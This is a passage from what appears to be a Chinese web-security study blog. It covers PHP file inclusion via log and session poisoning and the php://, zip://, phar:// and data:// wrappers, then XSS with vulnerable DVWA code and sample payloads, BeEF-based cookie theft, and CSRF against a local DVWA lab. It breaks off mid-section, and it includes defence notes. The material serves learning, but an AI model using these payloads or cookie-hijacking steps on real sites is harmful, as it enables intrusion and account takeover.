          <a href="#②远程文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#②远程文件包含" class="headerlink" title="②远程文件包含"></a>②远程文件包含</h4>
      <p>利用<code>URL</code>，使得网络中的可访问文件被包含，不过需要在<code>php.ini</code>中开启如下配置项</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen = on(默认开启)</span><br><span class="line">allow_url_include = on(php5.2以后默认关闭)</span><br></pre></td></tr></table></div></figure>

<p>如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/index.php?file=www.baidu.com</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-其他利用方式"   >
          <a href="#3-其他利用方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-其他利用方式" class="headerlink" title="(3)其他利用方式"></a>(3)其他利用方式</h3>
      
        <h4 id="①包含日志文件"   >
          <a href="#①包含日志文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#①包含日志文件" class="headerlink" title="①包含日志文件"></a>①包含日志文件</h4>
      <ul>
<li>利用原理</li>
</ul>
<p>输入<code>URL</code>时，输入相关的<code>php</code>代码使之报错，随即就会将相关的报错信息输入到<code>log</code>中，那么就可以将<code>php</code>的相关代码输入到日志中，那么我们包含该日志就会执行到该代码。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/index.php?file=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601174400213.png" alt="image-20220601174400213"></p>
<ul>
<li><p>利用条件：</p>
<ul>
<li>日志文件可读</li>
<li>知道日志文件的存储目录</li>
</ul>
</li>
<li><p>常见的日志文件目录：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601174509112.png" alt="image-20220601174509112"></p>
</li>
</ul>
<p>并且一般情况下日志存储目录会被修改，需要读取服务器的相关配置文件（<code>httpd.conf</code>,<code>nginx.conf</code>等），或者依据<code>phpinfo()</code>来获取。</p>
<p>相关的日志信息也可以被调整，限制。</p>

        <h4 id="②包含Session"   >
          <a href="#②包含Session" class="heading-link"><i class="fas fa-link"></i></a><a href="#②包含Session" class="headerlink" title="②包含Session"></a>②包含<code>Session</code></h4>
      <ul>
<li><p>条件：</p>
<ul>
<li><p><code>Session</code>中存在可控变量</p>
</li>
<li><p><code>Session</code>文件可以读写，并且知道存储路径</p>
</li>
</ul>
</li>
<li><p>默认存储路径：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601203337176.png" alt="image-20220601203337176"></p>
</li>
</ul>
<p>相关的<code>index.php</code>如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="variable">$username</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>输入<code>username</code>会记录<code>Session</code>，以序列化的形式存在，可以在<code>php.ini</code>中找到相关的保存路径</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601202513684.png" alt="image-20220601202513684"></p>
<p>那么访问即可获得<code>Session</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601202712181.png" alt="image-20220601202712181"></p>
<p>这样就可以尝试将该文件使用文件包含的形式来执行代码。</p>

        <h3 id="4-伪协议"   >
          <a href="#4-伪协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-伪协议" class="headerlink" title="(4)伪协议"></a>(4)伪协议</h3>
      <p>使用伪协议可以访问<code>PHP</code>的相关文件描述符，从而进行读取解析文件。</p>

        <h4 id="①使用例子"   >
          <a href="#①使用例子" class="heading-link"><i class="fas fa-link"></i></a><a href="#①使用例子" class="headerlink" title="①使用例子"></a>①使用例子</h4>
      <p>比如有时候直接文件包含不能够打印结果，比如说某个<code>test.php</code>，内容如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;aaaa&quot;</span>;</span><br><span class="line">	<span class="comment">//flag&#123;cccc&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>那么当<code>include</code>文件包含进入之后，解析<code>PHP</code>代码，只会输出<code>aaaa</code>，而不会输出<code>flag&#123;cccc&#125;</code>的内容，这时候就需要用到伪协议<code>php://filert</code>来将文件流包含进来，这样就会打印出<code>test.php</code>文件了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601210615644.png" alt="image-20220601210615644"></p>
<p>使用伪协议：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601210629504.png" alt="image-20220601210629504"></p>
<p><code>Burpsuite</code>解码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601210654804.png" alt="image-20220601210654804"></p>

        <h4 id="②各种伪协议"   >
          <a href="#②各种伪协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#②各种伪协议" class="headerlink" title="②各种伪协议"></a>②各种伪协议</h4>
      <ul>
<li><p><code>php://filter</code></p>
<p>通常用来读取文件</p>
<ul>
<li><p><code>php.ini</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=off/on</span><br><span class="line">allow_url_include=off/on</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>POC</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=test.php</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
<li><p><code>php://input</code></p>
<p>将<code>POST</code>请求的相关数据当作一个文件流输入进去，配合文件包含通常可以执行任意命令。</p>
<ul>
<li><p><code>php.ini</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=off/on</span><br><span class="line">allow_url_include=on</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>POC</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://input</span><br><span class="line">[POST DATA]&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
<li><p><code>zip://</code></p>
<p>访问压缩包里的文件，访问到的文件结合文件包含函数就会被当作<code>php</code>文件执行，从而实现任意代码执行。</p>
<ul>
<li><p><code>php.ini</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=off/on</span><br><span class="line">allow_url_include=off/on</span><br><span class="line">php &gt;= 5.2</span><br></pre></td></tr></table></div></figure>

<p>需要注意的是只要是压缩包即可，后缀名无所谓。相同类型的还要<code>zlib://</code>和<code>bzip2://</code></p>
</li>
<li><p><code>POC</code>：</p>
<p><code>#</code>需要进行<code>URL</code>编码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip://[压缩包绝对路径]#[压缩包内文件]</span><br><span class="line">?file=zip://D:\phpstudy_pro\WWW\test.zip%23test.php</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
<li><p><code>phar://</code></p>
<p><code>phar</code>是用来打包生成<code>php</code>项目用的，可以用相关协议进行解析，其中涉及到很多东西，比较常见的就是<code>zip</code>打包访问以及序列化、反序列的东西。</p>
<p>类似<code>zip://</code>，可以访问<code>zip</code>中的文件，并且相对路径和绝对路径都可以。</p>
<ul>
<li><p><code>php.ini</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=off/on</span><br><span class="line">allow_url_include=off/on</span><br><span class="line">php &gt;= 5.3</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>POC</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=phar://zip.jpg/phpinfo.txt</span><br><span class="line">?file=phar://D:\zip.jpg\phpinfo.txt</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
<li><p><code>data://</code></p>
<p>类似于<code>php://input</code>，让用户控制文件的输入流。</p>
<ul>
<li><p><code>php.ini</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=on</span><br><span class="line">allow_url_include=on</span><br><span class="line">php &gt;= 5.2</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>POC</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data://[&lt;MIME-type&gt;][;charset=&lt;encoding&gt;][;base64],&lt;data&gt;</span><br><span class="line">?file=data://,&lt;?php phpinfo();</span><br><span class="line">?file=data://text/plain,&lt;?php phpinfo();</span><br><span class="line">?file=data://text/plain;base64,[content]</span><br><span class="line">?file=data:text/plain,&lt;?php phpinfo();</span><br><span class="line">?file=data:text/plain;base64,[content]</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h3 id="5-防御"   >
          <a href="#5-防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-防御" class="headerlink" title="(5)防御"></a>(5)防御</h3>
      <ul>
<li><code>allow_url_include</code>和<code>allow_url_fopen</code>最小权限化</li>
<li>设置<code>open_basedir</code>将<code>php</code>所能打开的文件限制在指定的目录树中</li>
<li>白名单限制包含文件，或者严格过滤<code>./\</code></li>
</ul>

        <h2 id="漏洞SQL注入"   >
          <a href="#漏洞SQL注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞SQL注入" class="headerlink" title="漏洞SQL注入"></a>漏洞SQL注入</h2>
      <p>了解基本原理，各种利用方式，盲注，时间盲注，布尔盲注，堆叠注入之类的，也差不多会，但是种类太多啦。而且感觉这种类型，工具比实际的感觉会好用一些。此外由于现今数据库很多都开始使用模型来获取制造SQL语句，很难利用了，所以笔记就没有怎么记录。</p>

        <h2 id="漏洞XSS"   >
          <a href="#漏洞XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞XSS" class="headerlink" title="漏洞XSS"></a>漏洞XSS</h2>
      <p>跨站脚本(<code>Cross Site Scripting</code>)攻击，为了不和<code>CSS</code>产生歧义，所以缩写为<code>XSS</code>。</p>
<p>攻击者可以在页面插入恶意脚本（<code>JavaScript</code>）代码，受害者访问页面时，浏览器解析执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶意代码等行为。</p>
<p><code>XSS</code>即注入<code>HTML</code>代码</p>

        <h3 id="1-种类"   >
          <a href="#1-种类" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-种类" class="headerlink" title="(1)种类"></a>(1)种类</h3>
      
        <h4 id="①存储型"   >
          <a href="#①存储型" class="heading-link"><i class="fas fa-link"></i></a><a href="#①存储型" class="headerlink" title="①存储型"></a>①存储型</h4>
      <p>较为持久，一般在留言板、用户发帖、用户回帖的版块中，一般类似如下三步：</p>
<ul>
<li>插入留言：恶意代码数据存储到数据库中</li>
<li>查看留言：恶意代码数据从数据库中提取出来</li>
<li>内容在页面显示</li>
</ul>
<p><code>DVWA</code>的<code>Low Security</code>版本代码如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="comment">//基本没有过滤</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="comment">//插入到数据库中</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>那么就直接将恶意代码插入了数据库，不同的<code>DVWA Security</code>如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609104504618.png" alt="image-20220609104504618"></p>
<p>之后在解析的时候</p>
<p>没有过滤的直接解析为<code>HTML</code>代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609104554318.png" alt="image-20220609104554318"></p>
<p>过滤的信息被解析为相关的字符串</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609104633495.png" alt="image-20220609104633495"></p>

        <h4 id="②反射型"   >
          <a href="#②反射型" class="heading-link"><i class="fas fa-link"></i></a><a href="#②反射型" class="headerlink" title="②反射型"></a>②反射型</h4>
      <p>插入的数据不存储和读取数据库，直接回显到页面上，通常需要诱导用户去点击触发漏洞的地方。</p>
<p><code>DVWA</code>的<code>Low Security</code>版本代码如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="comment">//获取输入然后拼接字符串直接作为HTML代码输出</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>浏览器中解析如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609105153708.png" alt="image-20220609105153708"></p>

        <h4 id="③DOM型"   >
          <a href="#③DOM型" class="heading-link"><i class="fas fa-link"></i></a><a href="#③DOM型" class="headerlink" title="③DOM型"></a>③DOM型</h4>
      <p>比较少见，通过修改页面中的DOM节点，与客户端上的<code>JavaScript</code>进行交互，不会与服务端进行交互，通常是<code>document.write</code>函数</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> lang = <span class="built_in">document</span>.location.href.substring(<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line">	<span class="comment">//直接获取并且拼接，然后就document.write来写到整个HTML页面中</span></span><br><span class="line">	<span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br><span class="line">	<span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>没有写入其他的如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609140222567.png" alt="image-20220609140222567"></p>
<p>当从URL加入其他的拼接字符，其结构点发生变化，写入了我们的<code>JS</code>代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609140308956.png" alt="image-20220609140308956"></p>

        <h3 id="2-危害攻击"   >
          <a href="#2-危害攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-危害攻击" class="headerlink" title="(2)危害攻击"></a>(2)危害攻击</h3>
      <ul>
<li>钓鱼，可以伪造登录框和页面</li>
<li>Cookie盗取</li>
<li>获取IP</li>
<li>站点重定向</li>
<li><code>BOM/DOM</code>的操作</li>
<li>获取客户端的页面信息，比如窃取邮件内容</li>
<li><code>XSS</code>蠕虫，可以自我传播</li>
</ul>

        <h3 id="3-挖掘"   >
          <a href="#3-挖掘" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-挖掘" class="headerlink" title="(3)挖掘"></a>(3)挖掘</h3>
      <p>输入输出点，有的转义、过滤、消毒的等需要处理</p>

        <h3 id="4-触发漏洞"   >
          <a href="#4-触发漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-触发漏洞" class="headerlink" title="(4)触发漏洞"></a>(4)触发漏洞</h3>
      <ul>
<li><p>在<code>script</code>标签插入</p>
<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></div></figure></li>
<li><p>在事件中插入</p>
<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">javascript:alert(1);</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>在该方式下，<code>src</code>读取不到资源，就会触发后面的<code>javascript</code>代码，即<code>alert(1)</code></p>
</li>
<li><p>在协议中插入</p>
<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1);&quot;</span>&gt;</span>点此查看链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>点击这里就会跳转<code>href</code>中进行执行<code>javascript</code>代码</p>
</li>
<li><p>等等</p>
</li>
</ul>

        <h3 id="▲XSS的Payload大全："   >
          <a href="#▲XSS的Payload大全：" class="heading-link"><i class="fas fa-link"></i></a><a href="#▲XSS的Payload大全：" class="headerlink" title="▲XSS的Payload大全："></a>▲XSS的Payload大全：</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" >Cross-Site Scripting (XSS) Cheat Sheet - 2022 Edition | Web Security Academy (portswigger.net)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="▲XSS的题目大全"   >
          <a href="#▲XSS的题目大全" class="heading-link"><i class="fas fa-link"></i></a><a href="#▲XSS的题目大全" class="headerlink" title="▲XSS的题目大全"></a>▲XSS的题目大全</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xss.haozi.me/#/0x00" >alert(1) (haozi.me)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="5-XSS攻击平台"   >
          <a href="#5-XSS攻击平台" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-XSS攻击平台" class="headerlink" title="(5)XSS攻击平台"></a>(5)XSS攻击平台</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/firesunCN/BlueLotus_XSSReceiver" >firesunCN/BlueLotus_XSSReceiver (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，这个通常用来自定义<code>payload</code>，然后进行上线</p>
<p><code>Kali</code>下的<code>Beef</code>，有很多的模块，社工弹窗等，还挺全</p>

        <h3 id="Cookie盗取"   >
          <a href="#Cookie盗取" class="heading-link"><i class="fas fa-link"></i></a><a href="#Cookie盗取" class="headerlink" title="Cookie盗取"></a>Cookie盗取</h3>
      <p>使用<code>beef</code>的<code>hook.js</code>使得客户端执行恶意的<code>JS</code>代码后，会在<code>beef</code>中收到一些信息，其中就可以提取相关网站的<code>cookie</code>，之后使用无痕模式，将<code>Cookie</code>在<code>F12-&gt;App-&gt;Cookie-&gt;对应网站</code>下，修改填入相关盗取的<code>Cookie</code>即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609173011737.png" alt="image-20220609173011737"></p>

        <h3 id="6-防御"   >
          <a href="#6-防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-防御" class="headerlink" title="(6)防御"></a>(6)防御</h3>
      
        <h4 id="①代码防御"   >
          <a href="#①代码防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#①代码防御" class="headerlink" title="①代码防御"></a>①代码防御</h4>
      <p>在服务器的输入输出处理的时候使用过滤、编码、转移之类的，或者<code>HttpOnly</code>头来禁止<code>JS</code>代码读取<code>Cookie</code>。</p>

        <h4 id="②安全设备"   >
          <a href="#②安全设备" class="heading-link"><i class="fas fa-link"></i></a><a href="#②安全设备" class="headerlink" title="②安全设备"></a>②安全设备</h4>
      <p><code>WAF</code>和<code>IDS</code></p>

        <h4 id="③控制客户端输入规则"   >
          <a href="#③控制客户端输入规则" class="heading-link"><i class="fas fa-link"></i></a><a href="#③控制客户端输入规则" class="headerlink" title="③控制客户端输入规则"></a>③控制客户端输入规则</h4>
      <p>检测相关的输入</p>

        <h2 id="漏洞CSRF"   >
          <a href="#漏洞CSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞CSRF" class="headerlink" title="漏洞CSRF"></a>漏洞CSRF</h2>
      <p>CSRF（<code>Cross Site Request Forgery</code>），跨站点伪造请求。即攻击者在用户已经登录目标网站之后，诱导用户访问一个攻击者制造的攻击页面，利用用户身份对目标网站发起伪造用户身份操作的请求，相当于伪造用户。这个过程中没有盗取<code>Cookie</code>而是直接利用用户的<code>Cookie</code>来达到伪造用户身份的目的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220610150042385.png" alt="image-20220610150042385"></p>

        <h3 id="1-种类-1"   >
          <a href="#1-种类-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-种类-1" class="headerlink" title="(1)种类"></a>(1)种类</h3>
      
        <h4 id="GET型"   >
          <a href="#GET型" class="heading-link"><i class="fas fa-link"></i></a><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h4>
      <ul>
<li><p>无保护情况</p>
<p>当只需要进行<code>URL</code>提交即可完成功能，即只需要<code>GET</code>请求就能完成时。</p>
<p>如下，只是利用该<code>URL</code>传入参数，结合<code>Cookie</code>即可完成修改密码操作的时候。</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</span></span><br></pre></td></tr></table></div></figure>

<p>这种情况就直接伪造一个链接，诱导用户点击该链接，从而触发一个目标网站</p>
</li>
<li><p>有<code>Referer</code></p>
<p>在<code>Medium</code>版本下的加了一行代码</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( stripos( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> )</span><br></pre></td></tr></table></div></figure>

<p>即检测<code>Referer</code>是否是服务器本身，<code>SERVER_NAME</code>表示运行脚本所在服务器的主机名。（如果只是浏览器输入<code>URL</code>访问的话，其<code>Referer</code>字段为空，链接的话则不会，会保存来源网站）</p>
<p>所以这里我们就需要进行抓包伪造<code>Referer</code>字段。</p>
</li>
<li><p>有<code>token</code></p>
<p>在<code>High</code>版本下添加了</p>
